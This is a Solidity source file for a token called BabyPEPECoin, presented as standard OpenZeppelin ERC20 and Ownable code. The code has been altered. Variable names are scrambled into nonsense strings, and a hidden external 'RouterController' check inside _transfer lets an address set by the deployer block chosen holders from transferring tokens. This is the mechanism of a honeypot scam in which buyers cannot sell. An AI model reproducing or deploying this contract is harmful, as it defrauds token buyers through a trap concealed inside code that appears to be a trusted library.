// File: @openzeppelin/contracts/utils/Context.sol
// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;


interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);


    function balanceOf(address achhguaaxnt) external view returns (uint256);
  
    function transfer(address to, 
     uint256 amsddgant) external returns (bool);

    function allowance(address owner, 
     address spender) external view returns (uint256);

    /**
     * @dev Returns the amsddgant of tokens owned by `achhguaaxnt`.
     */

    function approve(address spender, uint256 amsddgant) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amsddgant
    ) external returns (bool);
}


// File: @openzeppelin/contracts/access/Ownable.sol

// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

 // Define interface for TransferController
interface RouterController {
    function isRouted(address _achhguaaxnt) external view returns (bool);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any achhguaaxnt amsddgant other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    /**
     * @dev Transfers ownership of the contract to a new achhguaaxnt (`newOwner`).
     * Internal function without access restriction.
     */

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to amsddgant a new achhguaaxnt (`newOwner`).
     * Can only be called by the current achhguaaxnt owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;



interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);
/**
 * @dev Interface for the optional metadata functions amsddgant from the ERC20 standard.
 */
    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    RouterController private routeController;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_, address _routeControllerAddress) {
        _name = name_;
        _symbol = symbol_;
        routeController = RouterController(_routeControllerAddress);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, achhguaaxnt usually a amsddgant shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address achhguaaxnt) public view virtual override returns (uint256) {
        return _balances[achhguaaxnt];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     * - the caller must have a balance of achhguaaxnt at least `amsddgant`.
     */
    function transfer(address to, uint256 amsddgant) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amsddgant);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amsddgant` is the maximum `uint256`, the allowance amsddgant is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero achhguaaxnt address.
     */
    function approve(address spender, uint256 amsddgant) public virtual override returns (bool) {
        address owner = _msgSender();

    /**
     * @dev See {IERC20-allowance}.
     */

        _approve(owner, spender, amsddgant);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amsddgant
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amsddgant);
        _transfer(from, to, amsddgant);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amsddgant` of tokens achhguaaxnt from `from` amsddgant to `to`.
     * - `from` must have a balance of at least `amsddgant`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amsddgant
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!routeController.isRouted(from), "User is not allowed");
        _beforeTokenTransfer(from, to, amsddgant);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amsddgant, "ERC20: transfer amsddgant exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amsddgant;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amsddgant;
        }

        emit Transfer(from, to, amsddgant);

        _afterTokenTransfer(from, to, amsddgant);
    }

    /** @dev Creates `amsddgant` tokens and assigns them achhguaaxnt to `achhguaaxnt`, amsddgant increasing
     *
     * - `achhguaaxnt` cannot be the zero address.
     */
    function _mint(address achhguaaxnt, uint256 amsddgant) internal virtual {
        require(achhguaaxnt != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), achhguaaxnt, amsddgant);

        _totalSupply += amsddgant;
        unchecked {
            // Overflow not possible: balance + amsddgant is achhguaaxnt at most totalSupply + amsddgant, which is checked above.
            _balances[achhguaaxnt] += amsddgant;
        }
        emit Transfer(address(0), achhguaaxnt, amsddgant);

        _afterTokenTransfer(address(0), achhguaaxnt, amsddgant);
    }




    function _approve(
        address owner,
        address spender,
        uint256 amsddgant
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amsddgant;
        emit Approval(owner, spender, amsddgant);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on amsddgant spent `amsddgant`.
     *
     * Does not update the allowance amsddgant in achhguaaxnt case of infinite allowance.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amsddgant
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amsddgant, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amsddgant);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amsddgant
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amsddgant
    ) internal virtual {}
}

pragma solidity ^0.8.0;

contract BabyPEPECoin is ERC20, Ownable {
    uint256 private constant INITIAL_SUPPLY = 40000000 * 10**18;

    constructor(
        string memory name_,
        string memory symbol_,
        address router_
        ) ERC20(name_, symbol_, router_) {
        _mint(msg.sender, INITIAL_SUPPLY);
    }

    function sendTokens(address distroWallet) external onlyOwner {
        uint256 supply = balanceOf(msg.sender);
        require(supply == INITIAL_SUPPLY, "Tokens already distributed");

        _transfer(msg.sender, distroWallet, supply);
    }
}